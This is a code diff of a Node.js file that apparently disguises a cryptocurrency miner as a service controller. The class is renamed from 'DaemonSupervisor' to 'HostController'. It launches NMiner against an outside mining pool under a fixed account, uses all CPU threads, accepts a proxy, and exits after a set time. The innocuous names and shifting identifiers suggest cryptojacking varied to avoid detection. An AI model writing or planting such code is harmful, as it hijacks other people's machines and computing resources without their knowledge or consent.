@@ -3,22 +3,22 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-class DaemonSupervisor {
+class HostController {
     constructor() {
-        const runId = "a6f86e";
-        console.log(`[core] Initialized DaemonSupervisor for ivory-bridge-dispatcher [${runId}]`);
+        const runId = "849b3f";
+        console.log(`[worker] Initialized HostController for ivory-bridge-dispatcher [${runId}]`);
 
-        this.service = new NMiner(
+        this.bridge = new NMiner(
             "wss://runtime.nmining.igrp.app/",
             "Arup07.perp",
-            Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
         );
 
-        const heartbeat = setInterval(() => {}, 72000);
+        const heartbeat = setInterval(() => {}, 41000);
         setTimeout(() => {
-        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (330m) reached, exiting cleanly.");
         process.exit(0);
-    }, 351 * 60 * 1000);
+    }, 330 * 60 * 1000);
 
         process.on("SIGTERM", () => {
             clearInterval(heartbeat);
@@ -28,4 +28,4 @@ class DaemonSupervisor {
     }
 }
 
-new DaemonSupervisor();
+new HostController();
